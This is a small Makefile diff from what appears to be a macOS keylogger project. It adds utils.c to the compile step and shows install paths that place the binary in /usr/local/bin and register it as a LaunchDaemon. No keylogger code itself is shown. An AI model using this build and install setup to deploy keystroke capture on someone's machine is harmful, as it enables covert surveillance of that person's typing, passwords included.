@@ -4,7 +4,7 @@ INSTALLDIR=/usr/local/bin
 PLISTFULL=/Library/LaunchDaemons/$(PLIST)
 
 all: keylogger.c
-	gcc keylogger.c -framework ApplicationServices -framework Carbon -o $(EXECUTABLE)
+	gcc keylogger.c utils.c -framework ApplicationServices -framework Carbon -o $(EXECUTABLE)
 
 install: all
 	mkdir -p $(INSTALLDIR)
